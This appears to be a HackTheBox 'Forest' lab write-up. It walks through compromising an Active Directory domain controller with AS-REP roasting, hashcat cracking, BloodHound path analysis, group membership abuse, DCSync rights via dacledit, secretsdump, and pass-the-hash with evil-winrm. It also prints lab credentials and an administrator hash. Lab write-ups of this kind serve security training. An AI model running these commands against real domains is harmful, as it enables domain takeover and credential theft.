# HackTheBox - Forest
**Youtube video:** https://youtu.be/8MVGwk2lMQY
---
## Initial Foothold

**Unauthenticated SMB Enumeration:**
- **Tool:** https://github.com/strikoder/OffensiveSecurity
```bash
# Check for no_auth_smb vulnerabilities
./no_auth_smb.sh $IP
```

**Unauthenticated Kerberos Enumeration:**
```bash
# AS-REP roasting without credentials
./no_auth_kerberos.sh $domain $IP

# Crack AS-REP hashes
hashcat -m 18200 hashes.asrep $rockyou

# Found credentials:
# svc-alfresco:s3rvice
```

---
## BloodHound Enumeration

**Collect AD Data:**
```bash
# Method 1: NetExec with BloodHound
nxc ldap $IP -u $user -p $pass -d $domain --dns-server $IP --bloodhound -c all

# Method 2: RustHound (alternative)
# /opt/RustHound-CE/rusthound-ce -d $domain -u $user@$domain -p $pass -z
```

**Attack Path Analysis:**
```
# BloodHound shows:
# svc-alfresco → Account Operators (member)
# Account Operators → GenericWrite → Enterprise Key Admins
# Enterprise Key Admins → AddKeyCredentialLink → Domain (DC)
```

---
## Privilege Escalation

**IMPORTANT: Execute these steps extremely fast**

**Step 1: Add User to Target Group**
```bash
# Add user to Enterprise Key Admins group
net rpc group addmem $targetgroup $user -U $domain/$user%$pass -S $dcip
```

**Step 2: Grant DCSync Rights**
```bash
# Write DCSync rights to user
dacledit.py -action 'write' -rights 'DCSync' -target-dn "dc=htb,dc=local" -principal $user $domain/$user:$pass
```

**Step 3: DCSync Attack**
```bash
# Dump domain secrets
secretsdump.py $domain/$user:$pass@$IP
```

**Step 4: Administrator Access**
```bash
# Pass-the-hash with administrator NTLM hash
evil-winrm -i $IP -u administrator -H 32693b11e6aa90eb43d32c72a07ceea6
```
